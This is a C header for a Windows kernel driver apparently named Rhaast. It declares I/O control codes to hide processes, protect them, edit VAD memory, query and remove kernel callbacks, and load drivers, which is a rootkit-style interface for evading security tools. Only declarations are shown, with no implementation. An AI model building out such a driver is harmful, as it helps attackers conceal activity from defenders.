#pragma once

#include <Common.h>
#include <Defines.h>

/* I/O Controls */
#define RHAAST_IOCTL_PROCESS_HIDE     CTL_CODE( 0x8000, RHAAST_COMMAND_PROCESS_HIDE,    METHOD_BUFFERED, FILE_ANY_ACCESS )
#define RHAAST_IOCTL_PROCESS_UNHIDE   CTL_CODE( 0x8000, RHAAST_COMMAND_PROCESS_UNHIDE,  METHOD_BUFFERED, FILE_ANY_ACCESS )
#define RHAAST_IOCTL_MEMORY_VAD       CTL_CODE( 0x8000, RHAAST_COMMAND_MEMORY_VAD,      METHOD_BUFFERED, FILE_ANY_ACCESS )
#define RHAAST_IOCTL_PROCESS_PROTECT  CTL_CODE( 0x8000, RHAAST_COMMAND_PROCESS_PROTECT, METHOD_BUFFERED, FILE_ANY_ACCESS )
#define RHAAST_IOCTL_CALLBACK_QUERY   CTL_CODE( 0x8000, RHAAST_COMMAND_CALLBACK_QUERY,  METHOD_BUFFERED, FILE_ANY_ACCESS )
#define RHAAST_IOCTL_CALLBACK_REMOVE  CTL_CODE( 0x8000, RHAAST_COMMAND_CALLBACK_REMOVE, METHOD_BUFFERED, FILE_ANY_ACCESS )
#define RHAAST_IOCTL_DRIVER_LOAD      CTL_CODE( 0x8000, RHAAST_COMMAND_DRIVER_LOAD,     METHOD_BUFFERED, FILE_ANY_ACCESS )

NTSTATUS TsIoCtlInit(
    VOID 
);

NTSTATUS TsIoCtlDispatch(
    _In_ _Out_ PDEVICE_OBJECT DeviceObject,
    _In_ _Out_ PIRP           Irp
);
